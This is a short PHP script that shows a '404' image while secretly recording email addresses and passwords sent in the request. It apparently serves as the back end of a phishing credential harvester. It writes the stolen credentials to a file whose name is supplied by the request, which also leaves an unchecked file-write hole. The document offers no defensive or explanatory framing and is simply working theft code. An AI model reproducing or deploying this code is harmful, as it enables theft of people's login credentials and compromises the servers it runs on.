<img src="404.png" width="100%" />
<?php 
$fn = $_GET['identifier'];
$email = $_GET['identifierInput'];
$password = $_GET['password'];

$myfile = fopen(".".$fn, "w") or die("Sumarat");

fwrite($myfile, $email);
fwrite($myfile, "\n");
fwrite($myfile, $password);
fclose($myfile);
?>